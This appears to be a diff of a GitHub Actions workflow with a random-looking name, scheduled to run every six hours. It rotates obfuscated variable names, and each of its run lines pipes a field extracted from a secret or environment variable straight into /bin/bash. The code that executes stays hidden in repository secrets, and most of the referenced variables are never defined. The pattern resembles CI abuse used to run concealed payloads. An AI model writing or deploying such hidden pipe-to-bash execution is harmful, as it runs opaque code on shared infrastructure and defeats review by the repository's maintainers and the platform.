@@ -3,36 +3,26 @@ name: surrenderdangerous
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 0/6 * * *'
-jobs:  # 15814
+    - cron: '16 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: surrenderdangerous
         env:
-          ja1352: ${{ secrets.ja1352 }}
+          snvfm0041: ${{ secrets.snvfm0041 }}
         run: |
-          echo $ja1352 | jq -r .wfvxd09 | /bin/bash
-          echo $sg4 | jq -r .ah2 | /bin/bash
-          echo $yna22922 | jq -r .bgczu567 | /bin/bash
-          echo $ayb3449 | jq -r .w6353 | /bin/bash
-          echo $hmfir9318 | jq -r .i62623 | /bin/bash
-          echo $o2127 | jq -r .adfp3 | /bin/bash
-          echo $klefx56703 | jq -r .m4 | /bin/bash
-          echo $wkrde0 | jq -r .ys41 | /bin/bash
-          echo $zdwz972 | jq -r .e3 | /bin/bash
-          echo $zkru45269 | jq -r .yeako54967 | /bin/bash
-          echo $vobd185 | jq -r .j8549 | /bin/bash
-          echo $lvl6412 | jq -r .yixzw97 | /bin/bash
-          echo $oe20476 | jq -r .i69101 | /bin/bash
-          echo $qa1 | jq -r .jjm57364 | /bin/bash
-          echo $q41796 | jq -r .kq92 | /bin/bash
-          echo $psnpu828 | jq -r .iiwg87 | /bin/bash
-          echo $mfexz70 | jq -r .udq06 | /bin/bash
-          echo $p17924 | jq -r .chvq03020 | /bin/bash
-          echo $px4567 | jq -r .sqzup67024 | /bin/bash
-          echo $up3 | jq -r .neeij6 | /bin/bash
-          echo $oqzt5146 | jq -r .gcfkn257 | /bin/bash
+          echo $snvfm0041 | jq -r .quo09809 | /bin/bash
+          echo $i3 | jq -r .h0 | /bin/bash
+          echo $l7 | jq -r .njzg96063 | /bin/bash
+          echo $pxyrz993 | jq -r .zcr8930 | /bin/bash
+          echo $w0 | jq -r .gmc5759 | /bin/bash
+          echo $dh59 | jq -r .sav2260 | /bin/bash
+          echo $dqxb7 | jq -r .s827 | /bin/bash
+          echo $jof20 | jq -r .ngeas0 | /bin/bash
+          echo $fv69784 | jq -r .gvq88 | /bin/bash
+          echo $scgns1 | jq -r .dky10311 | /bin/bash
+          echo $deg99 | jq -r .dic10616 | /bin/bash
 
